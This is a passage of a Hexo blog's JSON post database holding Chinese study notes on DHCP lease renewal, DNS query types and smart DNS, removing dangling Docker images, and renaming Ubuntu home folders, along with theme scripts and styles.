start=\"2\">\n<li><strong>第二次续约请求</strong>：</li>\n</ol>\n<ul>\n<li>发生在租约时间的三分之二处，即租约的66.67%时间。使用上述示例，这将在约5小时20分钟时发生。</li>\n<li>类似于第一次续约请求，客户端发送DHCP Request消息，请求续约租约。</li>\n<li>DHCP服务器再次可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。</li>\n<li>如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试再次进行续约请求。</li>\n</ul>\n<p>续约请求的目的是确保客户端在租约即将到期时继续使用相同的IP地址，而不会导致IP地址被释放并重新分配给其他设备。通过这种方式，DHCP客户端可以保持网络连接的连续性，而不必在租约到期时重新配置网络设置。这有助于网络的稳定性和可用性。</p>"},{"title":"关于 DNS 的理论知识","date":"2023-10-06T03:29:08.000Z","_content":"\n### DNS 的迭代查询和递归查询\n\n首先来个总结：   \n迭代查询；我不会你不会，你知道谁会，于是你让我去问。   \n递归查询：我不会你不会，你帮我去问，问完回来告诉我。\n\n<!-- more -->\n\n![迭代查询和递归查询](./DNS-server/1.jpg)\n\n知乎一篇文章写的很好，[**点击跳转**](https://zhuanlan.zhihu.com/p/61394192)\n\n### 查询步骤\n\n1. 客户机首先查看本地hosts文件是否有解析记录，有则直接用来访问web server\n2. 没有则向网卡中记录的首选DNS(本地DNS) 发起查询请求\n3. 本地DNS若有记录则返回给客户端，客户端接收到后直接访问web server\n4. 若没有，则本地DNS向根域服务器发起请求，请求解析对应顶级域的IP地址\n5. 本地DNS得到顶级域服务器IP后，再向顶级域服务器发起请求，请求解析权威DNS服务器的IP地址\n6. 本地DNS服务器获取到权威DNS服务器IP地址后，再向其查询具体的完整域名的对\n应解析记录\n7. 最终本地DNS将杏询到的对应域名的解析记录发送给客户端，并在本地记录一份\n\n### 智能 DNS \n\n智能DNS（Intelligent DNS）具有多种功能和优势，它可以为网络管理员、网站运营商和最终用户提供多种服务和增强功能。以下是智能DNS可以实现的一些功能：\n\n1. **负载均衡**：\n- 智能DNS可以分发流量到多个服务器或数据中心，以确保网络负载均衡。这有助于提高网站性能和可用性，避免服务器过载。\n\n2. **地理定位**：\n- 智能DNS可以根据用户的地理位置，将他们定向到最近或最优的服务器。这降低了响应时间，提高了用户体验。\n\n3. **故障转移**：\n- 如果某个服务器或数据中心出现故障，智能DNS可以自动将流量转移到备用服务器，确保连续性和可用性。\n\n4. **内容分发**：\n- 智能DNS可用于构建内容分发网络（CDN），通过将用户定向到最近的CDN节点，加速内容传送，降低延迟，并减少带宽消耗。\n\n5. **安全性**：\n- 智能DNS可以检测和阻止恶意流量，例如分布式拒绝服务攻击（DDoS），并提供防御措施，以确保网络的安全性。\n\n6. **弹性伸缩**：\n- 智能DNS可以根据实际流量负载自动扩展或缩小资源，以适应峰值和低谷时期的需求。\n\n7. **DNS级别的安全性**：\n- 智能DNS可以支持DNSSEC（DNS安全扩展），以保护DNS查询免受潜在的欺骗和中间人攻击。\n\n8. **定制策略**：\n- 智能DNS允许管理员根据自定义策略和需求来定制DNS解析行为，例如按照特定规则路由流量或控制缓存行为。\n\n9. **监控和分析**：\n- 智能DNS通常提供监控和分析功能，允许管理员跟踪流量、性能指标和DNS查询，以进行性能优化和故障排除。\n\n10. **用户体验改进**：\n- 通过提供更快的响应时间、减少延迟和确保高可用性，智能DNS可以改善用户的在线体验。\n\n总之，智能DNS通过利用高级策略和技术，可以优化网络性能、提高可用性、增强安全性，并满足各种网络需求。这些功能使其成为企业、网站运营商和云服务提供商的关键工具，用于管理复杂的网络基础设施。","source":"_posts/DNS-server.md","raw":"---\ntitle: 关于 DNS 的理论知识\ndate: 2023-10-06 11:29:08\ncategories: 理论知识\ntags:\n  - 面试\n  - 网络基础\n---\n\n### DNS 的迭代查询和递归查询\n\n首先来个总结：   \n迭代查询；我不会你不会，你知道谁会，于是你让我去问。   \n递归查询：我不会你不会，你帮我去问，问完回来告诉我。\n\n<!-- more -->\n\n![迭代查询和递归查询](./DNS-server/1.jpg)\n\n知乎一篇文章写的很好，[**点击跳转**](https://zhuanlan.zhihu.com/p/61394192)\n\n### 查询步骤\n\n1. 客户机首先查看本地hosts文件是否有解析记录，有则直接用来访问web server\n2. 没有则向网卡中记录的首选DNS(本地DNS) 发起查询请求\n3. 本地DNS若有记录则返回给客户端，客户端接收到后直接访问web server\n4. 若没有，则本地DNS向根域服务器发起请求，请求解析对应顶级域的IP地址\n5. 本地DNS得到顶级域服务器IP后，再向顶级域服务器发起请求，请求解析权威DNS服务器的IP地址\n6. 本地DNS服务器获取到权威DNS服务器IP地址后，再向其查询具体的完整域名的对\n应解析记录\n7. 最终本地DNS将杏询到的对应域名的解析记录发送给客户端，并在本地记录一份\n\n### 智能 DNS \n\n智能DNS（Intelligent DNS）具有多种功能和优势，它可以为网络管理员、网站运营商和最终用户提供多种服务和增强功能。以下是智能DNS可以实现的一些功能：\n\n1. **负载均衡**：\n- 智能DNS可以分发流量到多个服务器或数据中心，以确保网络负载均衡。这有助于提高网站性能和可用性，避免服务器过载。\n\n2. **地理定位**：\n- 智能DNS可以根据用户的地理位置，将他们定向到最近或最优的服务器。这降低了响应时间，提高了用户体验。\n\n3. **故障转移**：\n- 如果某个服务器或数据中心出现故障，智能DNS可以自动将流量转移到备用服务器，确保连续性和可用性。\n\n4. **内容分发**：\n- 智能DNS可用于构建内容分发网络（CDN），通过将用户定向到最近的CDN节点，加速内容传送，降低延迟，并减少带宽消耗。\n\n5. **安全性**：\n- 智能DNS可以检测和阻止恶意流量，例如分布式拒绝服务攻击（DDoS），并提供防御措施，以确保网络的安全性。\n\n6. **弹性伸缩**：\n- 智能DNS可以根据实际流量负载自动扩展或缩小资源，以适应峰值和低谷时期的需求。\n\n7. **DNS级别的安全性**：\n- 智能DNS可以支持DNSSEC（DNS安全扩展），以保护DNS查询免受潜在的欺骗和中间人攻击。\n\n8. **定制策略**：\n- 智能DNS允许管理员根据自定义策略和需求来定制DNS解析行为，例如按照特定规则路由流量或控制缓存行为。\n\n9. **监控和分析**：\n- 智能DNS通常提供监控和分析功能，允许管理员跟踪流量、性能指标和DNS查询，以进行性能优化和故障排除。\n\n10. **用户体验改进**：\n- 通过提供更快的响应时间、减少延迟和确保高可用性，智能DNS可以改善用户的在线体验。\n\n总之，智能DNS通过利用高级策略和技术，可以优化网络性能、提高可用性、增强安全性，并满足各种网络需求。这些功能使其成为企业、网站运营商和云服务提供商的关键工具，用于管理复杂的网络基础设施。","slug":"DNS-server","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5db000u7zj30puofn65","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"DNS-的迭代查询和递归查询\"><a href=\"#DNS-的迭代查询和递归查询\" class=\"headerlink\" title=\"DNS 的迭代查询和递归查询\"></a>DNS 的迭代查询和递归查询</h3><p>首先来个总结：<br>迭代查询；我不会你不会，你知道谁会，于是你让我去问。<br>递归查询：我不会你不会，你帮我去问，问完回来告诉我。</p>\n<span id=\"more\"></span>\n\n<p><img src=\"/2023/10/06/DNS-server/1.jpg\" alt=\"迭代查询和递归查询\"></p>\n<p>知乎一篇文章写的很好，<a href=\"https://zhuanlan.zhihu.com/p/61394192\"><strong>点击跳转</strong></a></p>\n<h3 id=\"查询步骤\"><a href=\"#查询步骤\" class=\"headerlink\" title=\"查询步骤\"></a>查询步骤</h3><ol>\n<li>客户机首先查看本地hosts文件是否有解析记录，有则直接用来访问web server</li>\n<li>没有则向网卡中记录的首选DNS(本地DNS) 发起查询请求</li>\n<li>本地DNS若有记录则返回给客户端，客户端接收到后直接访问web server</li>\n<li>若没有，则本地DNS向根域服务器发起请求，请求解析对应顶级域的IP地址</li>\n<li>本地DNS得到顶级域服务器IP后，再向顶级域服务器发起请求，请求解析权威DNS服务器的IP地址</li>\n<li>本地DNS服务器获取到权威DNS服务器IP地址后，再向其查询具体的完整域名的对<br>应解析记录</li>\n<li>最终本地DNS将杏询到的对应域名的解析记录发送给客户端，并在本地记录一份</li>\n</ol>\n<h3 id=\"智能-DNS\"><a href=\"#智能-DNS\" class=\"headerlink\" title=\"智能 DNS\"></a>智能 DNS</h3><p>智能DNS（Intelligent DNS）具有多种功能和优势，它可以为网络管理员、网站运营商和最终用户提供多种服务和增强功能。以下是智能DNS可以实现的一些功能：</p>\n<ol>\n<li><strong>负载均衡</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以分发流量到多个服务器或数据中心，以确保网络负载均衡。这有助于提高网站性能和可用性，避免服务器过载。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>地理定位</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以根据用户的地理位置，将他们定向到最近或最优的服务器。这降低了响应时间，提高了用户体验。</li>\n</ul>\n<ol start=\"3\">\n<li><strong>故障转移</strong>：</li>\n</ol>\n<ul>\n<li>如果某个服务器或数据中心出现故障，智能DNS可以自动将流量转移到备用服务器，确保连续性和可用性。</li>\n</ul>\n<ol start=\"4\">\n<li><strong>内容分发</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可用于构建内容分发网络（CDN），通过将用户定向到最近的CDN节点，加速内容传送，降低延迟，并减少带宽消耗。</li>\n</ul>\n<ol start=\"5\">\n<li><strong>安全性</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以检测和阻止恶意流量，例如分布式拒绝服务攻击（DDoS），并提供防御措施，以确保网络的安全性。</li>\n</ul>\n<ol start=\"6\">\n<li><strong>弹性伸缩</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以根据实际流量负载自动扩展或缩小资源，以适应峰值和低谷时期的需求。</li>\n</ul>\n<ol start=\"7\">\n<li><strong>DNS级别的安全性</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以支持DNSSEC（DNS安全扩展），以保护DNS查询免受潜在的欺骗和中间人攻击。</li>\n</ul>\n<ol start=\"8\">\n<li><strong>定制策略</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS允许管理员根据自定义策略和需求来定制DNS解析行为，例如按照特定规则路由流量或控制缓存行为。</li>\n</ul>\n<ol start=\"9\">\n<li><strong>监控和分析</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS通常提供监控和分析功能，允许管理员跟踪流量、性能指标和DNS查询，以进行性能优化和故障排除。</li>\n</ul>\n<ol start=\"10\">\n<li><strong>用户体验改进</strong>：</li>\n</ol>\n<ul>\n<li>通过提供更快的响应时间、减少延迟和确保高可用性，智能DNS可以改善用户的在线体验。</li>\n</ul>\n<p>总之，智能DNS通过利用高级策略和技术，可以优化网络性能、提高可用性、增强安全性，并满足各种网络需求。这些功能使其成为企业、网站运营商和云服务提供商的关键工具，用于管理复杂的网络基础设施。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"DNS-的迭代查询和递归查询\"><a href=\"#DNS-的迭代查询和递归查询\" class=\"headerlink\" title=\"DNS 的迭代查询和递归查询\"></a>DNS 的迭代查询和递归查询</h3><p>首先来个总结：<br>迭代查询；我不会你不会，你知道谁会，于是你让我去问。<br>递归查询：我不会你不会，你帮我去问，问完回来告诉我。</p>","more":"<p><img src=\"/2023/10/06/DNS-server/1.jpg\" alt=\"迭代查询和递归查询\"></p>\n<p>知乎一篇文章写的很好，<a href=\"https://zhuanlan.zhihu.com/p/61394192\"><strong>点击跳转</strong></a></p>\n<h3 id=\"查询步骤\"><a href=\"#查询步骤\" class=\"headerlink\" title=\"查询步骤\"></a>查询步骤</h3><ol>\n<li>客户机首先查看本地hosts文件是否有解析记录，有则直接用来访问web server</li>\n<li>没有则向网卡中记录的首选DNS(本地DNS) 发起查询请求</li>\n<li>本地DNS若有记录则返回给客户端，客户端接收到后直接访问web server</li>\n<li>若没有，则本地DNS向根域服务器发起请求，请求解析对应顶级域的IP地址</li>\n<li>本地DNS得到顶级域服务器IP后，再向顶级域服务器发起请求，请求解析权威DNS服务器的IP地址</li>\n<li>本地DNS服务器获取到权威DNS服务器IP地址后，再向其查询具体的完整域名的对<br>应解析记录</li>\n<li>最终本地DNS将杏询到的对应域名的解析记录发送给客户端，并在本地记录一份</li>\n</ol>\n<h3 id=\"智能-DNS\"><a href=\"#智能-DNS\" class=\"headerlink\" title=\"智能 DNS\"></a>智能 DNS</h3><p>智能DNS（Intelligent DNS）具有多种功能和优势，它可以为网络管理员、网站运营商和最终用户提供多种服务和增强功能。以下是智能DNS可以实现的一些功能：</p>\n<ol>\n<li><strong>负载均衡</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以分发流量到多个服务器或数据中心，以确保网络负载均衡。这有助于提高网站性能和可用性，避免服务器过载。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>地理定位</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以根据用户的地理位置，将他们定向到最近或最优的服务器。这降低了响应时间，提高了用户体验。</li>\n</ul>\n<ol start=\"3\">\n<li><strong>故障转移</strong>：</li>\n</ol>\n<ul>\n<li>如果某个服务器或数据中心出现故障，智能DNS可以自动将流量转移到备用服务器，确保连续性和可用性。</li>\n</ul>\n<ol start=\"4\">\n<li><strong>内容分发</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可用于构建内容分发网络（CDN），通过将用户定向到最近的CDN节点，加速内容传送，降低延迟，并减少带宽消耗。</li>\n</ul>\n<ol start=\"5\">\n<li><strong>安全性</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以检测和阻止恶意流量，例如分布式拒绝服务攻击（DDoS），并提供防御措施，以确保网络的安全性。</li>\n</ul>\n<ol start=\"6\">\n<li><strong>弹性伸缩</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以根据实际流量负载自动扩展或缩小资源，以适应峰值和低谷时期的需求。</li>\n</ul>\n<ol start=\"7\">\n<li><strong>DNS级别的安全性</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS可以支持DNSSEC（DNS安全扩展），以保护DNS查询免受潜在的欺骗和中间人攻击。</li>\n</ul>\n<ol start=\"8\">\n<li><strong>定制策略</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS允许管理员根据自定义策略和需求来定制DNS解析行为，例如按照特定规则路由流量或控制缓存行为。</li>\n</ul>\n<ol start=\"9\">\n<li><strong>监控和分析</strong>：</li>\n</ol>\n<ul>\n<li>智能DNS通常提供监控和分析功能，允许管理员跟踪流量、性能指标和DNS查询，以进行性能优化和故障排除。</li>\n</ul>\n<ol start=\"10\">\n<li><strong>用户体验改进</strong>：</li>\n</ol>\n<ul>\n<li>通过提供更快的响应时间、减少延迟和确保高可用性，智能DNS可以改善用户的在线体验。</li>\n</ul>\n<p>总之，智能DNS通过利用高级策略和技术，可以优化网络性能、提高可用性、增强安全性，并满足各种网络需求。这些功能使其成为企业、网站运营商和云服务提供商的关键工具，用于管理复杂的网络基础设施。</p>"},{"title":"Docker的虚悬镜像的查看和删除","date":"2023-08-07T17:06:41.000Z","_content":"\n### 什么是虚悬镜像\n\n虚悬镜像（dangling image）一言以蔽之：镜像既没有仓库名，也没有标签，均为\\<none>\n\n\\<none>      \\<none>     02385df0ef86    3 days ago   123 MB\n\n<!-- more -->\n\n### 查看虚悬镜像\n\n```bash\ndocker images -f dangling=true\n```\n\n### 删除虚悬镜像\n\n```bash\ndocker rmi $(docker images -q -f dangling=true)\n```","source":"_posts/DanglingImage.md","raw":"---\ntitle: Docker的虚悬镜像的查看和删除\ndate: 2023-08-08 01:06:41\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n### 什么是虚悬镜像\n\n虚悬镜像（dangling image）一言以蔽之：镜像既没有仓库名，也没有标签，均为\\<none>\n\n\\<none>      \\<none>     02385df0ef86    3 days ago   123 MB\n\n<!-- more -->\n\n### 查看虚悬镜像\n\n```bash\ndocker images -f dangling=true\n```\n\n### 删除虚悬镜像\n\n```bash\ndocker rmi $(docker images -q -f dangling=true)\n```","slug":"DanglingImage","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dc000x7zj3eacn980a","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"什么是虚悬镜像\"><a href=\"#什么是虚悬镜像\" class=\"headerlink\" title=\"什么是虚悬镜像\"></a>什么是虚悬镜像</h3><p>虚悬镜像（dangling image）一言以蔽之：镜像既没有仓库名，也没有标签，均为&lt;none&gt;</p>\n<p>&lt;none&gt;      &lt;none&gt;     02385df0ef86    3 days ago   123 MB</p>\n<span id=\"more\"></span>\n\n<h3 id=\"查看虚悬镜像\"><a href=\"#查看虚悬镜像\" class=\"headerlink\" title=\"查看虚悬镜像\"></a>查看虚悬镜像</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker images -f dangling=<span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"删除虚悬镜像\"><a href=\"#删除虚悬镜像\" class=\"headerlink\" title=\"删除虚悬镜像\"></a>删除虚悬镜像</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker rmi $(docker images -q -f dangling=<span class=\"literal\">true</span>)</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"什么是虚悬镜像\"><a href=\"#什么是虚悬镜像\" class=\"headerlink\" title=\"什么是虚悬镜像\"></a>什么是虚悬镜像</h3><p>虚悬镜像（dangling image）一言以蔽之：镜像既没有仓库名，也没有标签，均为&lt;none&gt;</p>\n<p>&lt;none&gt;      &lt;none&gt;     02385df0ef86    3 days ago   123 MB</p>","more":"<h3 id=\"查看虚悬镜像\"><a href=\"#查看虚悬镜像\" class=\"headerlink\" title=\"查看虚悬镜像\"></a>查看虚悬镜像</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker images -f dangling=<span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"删除虚悬镜像\"><a href=\"#删除虚悬镜像\" class=\"headerlink\" title=\"删除虚悬镜像\"></a>删除虚悬镜像</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker rmi $(docker images -q -f dangling=<span class=\"literal\">true</span>)</span><br></pre></td></tr></table></figure>"},{"title":"移除Ubuntu桌面的家目录文件夹","date":"2023-08-06T12:51:19.000Z","_content":"\n### 问题描述\n\n由于中文版Ubuntu的系统在个人家目录会显示中文的文件夹（桌面，文档，照片等这些），因为在进入这些目录时需要先修改输入法语言，在使用了一段时间的Ubuntu后，感到实在费劲，所以索性将这些文件夹都改成了对应的英文名字，比如桌面对应“Desktop”，后来导致Ubuntu开机之后，家目录下的文件夹全部都显示到了桌面，真的是丑到极点。\n\n后来经过一番的查找资料，终于找到了解决办法。\n\n### 解决办法\n\n1. 在Ubuntu系统中有一个文件夹管理着家目录的文件夹名字和家目录某种程度上的系统变量的关系。在这个文件夹中记录着系统变量和家目录的对应关系。\n\n<!-- more -->\n\n2. 可以直接查看这个文件`cat ~/.config/user-dirs.dirs`\n\n```bash 折叠代码\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/桌面\"\nXDG_DOWNLOAD_DIR=\"$HOME/下载\"\nXDG_TEMPLATES_DIR=\"$HOME/模板\"\nXDG_PUBLICSHARE_DIR=\"$HOME/公共\"\nXDG_DOCUMENTS_DIR=\"$HOME/文档\"\nXDG_MUSIC_DIR=\"$HOME/音乐\"\nXDG_PICTURES_DIR=\"$HOME/图片\"\nXDG_VIDEOS_DIR=\"$HOME/视频\"\n```\n\n3. 上面是我修改完之前的样子，在修改之后是这样的：\n\n```bash 折叠代码\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Template\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Document\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Picture\"\nXDG_VIDEOS_DIR=\"$HOME/Viedo\"\n```\n\n4. 修改完这个配置文件，然后把家目录的对应文件夹的名字修改为与配置文件一致就OK了！\n\n```bash\nknight@knight:~/.ssh$ cd ~\nknight@knight:~$ ls\naliyun  Desktop   Downloads  nustarain          Public    snap      Viedo\nchrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code\nclash   Document  node       Picture            qq_music  Template  wechat\n```\n\n5. 关机，重启，就会发现桌面的家目录文件夹全都消失了。","source":"_posts/DelDesktopFolder.md","raw":"---\ntitle: 移除Ubuntu桌面的家目录文件夹\ndate: 2023-08-06 20:51:19\ncategories: 探索\ntags:\n  - Ubuntu\n---\n\n### 问题描述\n\n由于中文版Ubuntu的系统在个人家目录会显示中文的文件夹（桌面，文档，照片等这些），因为在进入这些目录时需要先修改输入法语言，在使用了一段时间的Ubuntu后，感到实在费劲，所以索性将这些文件夹都改成了对应的英文名字，比如桌面对应“Desktop”，后来导致Ubuntu开机之后，家目录下的文件夹全部都显示到了桌面，真的是丑到极点。\n\n后来经过一番的查找资料，终于找到了解决办法。\n\n### 解决办法\n\n1. 在Ubuntu系统中有一个文件夹管理着家目录的文件夹名字和家目录某种程度上的系统变量的关系。在这个文件夹中记录着系统变量和家目录的对应关系。\n\n<!-- more -->\n\n2. 可以直接查看这个文件`cat ~/.config/user-dirs.dirs`\n\n```bash 折叠代码\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a 